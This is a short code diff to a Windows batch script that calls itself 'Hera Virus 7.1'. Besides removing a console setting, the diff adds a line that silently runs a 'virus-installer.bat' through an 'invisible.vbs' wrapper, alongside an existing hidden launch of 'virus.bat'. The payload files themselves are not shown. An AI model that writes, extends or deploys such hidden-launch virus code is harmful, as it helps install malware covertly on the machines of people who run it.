@@ -1,7 +1,6 @@
 @echo off
 color F0
 title Hera Virus 7.1
-mode con lines=32766
 echo _____________________________________________________________________
 echo Hera Virus 7.1 (Trust Edtion)
 echo Created by OCID (now known as the Acceleration Team)
@@ -159,3 +158,4 @@ EXIT
 
 :yes
 wscript.exe "invisible.vbs" "virus.bat"
+wscript.exe "invisible.vbs" "virus-installer.bat"
